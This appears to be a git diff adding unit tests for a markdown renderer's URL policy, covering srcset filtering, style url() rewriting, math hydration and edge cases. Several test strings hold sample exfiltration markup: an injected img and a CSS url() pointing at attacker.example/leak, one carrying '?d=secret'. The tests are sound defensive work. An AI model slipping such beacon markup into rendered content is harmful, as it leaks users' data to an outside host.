@@ -8,6 +8,7 @@ import { renderMarkdownUnsafe } from './renderer.ts'
 import { sanitizeRenderedMarkdown } from './sanitize.ts'
 import { filterMarkupUrlsString } from './url-filter-markup.ts'
 import { hydratePendingDiagrams, type DiagramRenderer } from './mermaid.ts'
+import { hydratePendingMath, type MathRenderer } from './math.ts'
 import type { UrlPolicy, UrlRequest } from './url-policy.ts'
 
 const APP = 'https://app.example.com'
@@ -252,5 +253,124 @@ describe('urlPolicy — mermaid hydration end to end', () => {
       host.querySelector('img')?.getAttribute('src'),
       'https://attacker.example/leak?d=secret',
     )
+  })
+})
+
+describe('urlPolicy — the rest of the URL-bearing surface', () => {
+  it('polices each srcset candidate independently', () => {
+    const { policy } = recordingPolicy((r) =>
+      r.raw.includes('ok.example') ? r.raw : null,
+    )
+    const out = withConfig({ urlPolicy: policy }, () =>
+      filterMarkupUrlsString(
+        '<img srcset="https://ok.example/1x.png 1x, https://bad.example/2x.png 2x">',
+        'diagram',
+      ),
+    )
+    assert.match(out, /srcset="https:\/\/ok\.example\/1x\.png 1x"/)
+    assert.doesNotMatch(out, /bad\.example/)
+  })
+
+  it('drops the srcset attribute when no candidate survives', () => {
+    const { policy } = recordingPolicy(() => null)
+    const out = withConfig({ urlPolicy: policy }, () =>
+      filterMarkupUrlsString('<img srcset="https://bad.example/2x.png 2x">', 'diagram'),
+    )
+    assert.doesNotMatch(out, /srcset/)
+  })
+
+  it('neutralizes url() in a style attribute, not just a <style> element', () => {
+    const { policy, seen } = recordingPolicy(blockSubresources)
+    const out = withConfig({ urlPolicy: policy }, () =>
+      filterMarkupUrlsString(
+        '<div style="background-image: url(https://attacker.example/x)">y</div>',
+        'diagram',
+      ),
+    )
+    assert.doesNotMatch(out, /attacker\.example/)
+    assert.match(out, /about:blank/)
+    assert.equal(seen[0]?.sink, 'style')
+  })
+
+  it('hands the policy url: null when the destination does not resolve', () => {
+    const seen: UrlRequest[] = []
+    // An empty baseOrigin is a base the URL parser rejects, so a relative
+    // destination resolves to nothing — the policy still gets to decide.
+    const policy: UrlPolicy = {
+      baseOrigin: '',
+      createURL(request) {
+        seen.push(request)
+        return request.raw
+      },
+    }
+    withConfig({ urlPolicy: policy }, () => renderMarkdownUnsafe('[x](/relative/page)'))
+    assert.equal(seen[0]?.url, null)
+    assert.equal(seen[0]?.raw, '/relative/page')
+  })
+})
+
+describe('urlPolicy — math hydration', () => {
+  const MATH_MD = '```math\nE = mc^2\n```'
+  const EVIL_HTML = '<span class="katex"><img src="https://attacker.example/leak"></span>'
+  const stub: MathRenderer = { render: () => Promise.resolve({ html: EVIL_HTML }) }
+
+  function pendingHost(): HTMLElement {
+    const host = document.createElement('div')
+    host.innerHTML = renderMarkdownUnsafe(MATH_MD)
+    return host
+  }
+
+  it('filters backend HTML before it reaches the element', async () => {
+    const { policy } = recordingPolicy(blockSubresources)
+    const host = pendingHost()
+    const count = await hydratePendingMath(host, { renderer: stub, urlPolicy: policy })
+
+    assert.equal(count, 1)
+    assert.equal(host.querySelector('img')?.hasAttribute('src'), false)
+    assert.ok(host.querySelector('.math-block--rendered'))
+  })
+
+  it('leaves it untouched when no policy is supplied', async () => {
+    const host = pendingHost()
+    await hydratePendingMath(host, { renderer: stub })
+    assert.equal(host.querySelector('img')?.getAttribute('src'), 'https://attacker.example/leak')
+  })
+})
+
+describe('urlPolicy — filter edge cases', () => {
+  const filter = (markup: string, decide: (r: UrlRequest) => string | null): string => {
+    const { policy } = recordingPolicy(decide)
+    return withConfig({ urlPolicy: policy }, () => filterMarkupUrlsString(markup, 'diagram'))
+  }
+
+  it('leaves an empty attribute and an empty url() alone', () => {
+    const out = filter('<img src=""><div style="background: url()">x</div>', () => null)
+    assert.match(out, /src=""/, 'nothing to decide, nothing removed')
+    assert.match(out, /url\(\)/)
+  })
+
+  it('handles quoted url() forms and rewrites in place', () => {
+    const out = filter(
+      `<style>a { background: url("https://cdn.example/a.png"); } b { background: url('https://cdn.example/b.png'); }</style>`,
+      (r) => r.raw.replace('cdn.example', 'proxy.example'),
+    )
+    assert.match(out, /url\("https:\/\/proxy\.example\/a\.png"\)/)
+    assert.match(out, /url\("https:\/\/proxy\.example\/b\.png"\)/)
+  })
+
+  it('preserves every URL when the policy returns each one unchanged', () => {
+    // Not byte-identical: the STRING path re-serializes (`<image/>` comes back as
+    // `<image></image>`), which is why the node path is preferred for a DOM sink.
+    const markup =
+      '<svg><image href="https://cdn.example/a.png"/><style>a{background:url(https://cdn.example/b.png)}</style></svg>'
+    const out = filter(markup, (r) => r.raw)
+    assert.match(out, /href="https:\/\/cdn\.example\/a\.png"/)
+    assert.match(out, /url\(https:\/\/cdn\.example\/b\.png\)/)
+  })
+
+  it('skips an empty <style> and non-URL attributes', () => {
+    const out = filter('<style></style><div class="x" data-y="z">t</div>', () => null)
+    assert.match(out, /class="x"/)
+    assert.match(out, /data-y="z"/)
   })
 })
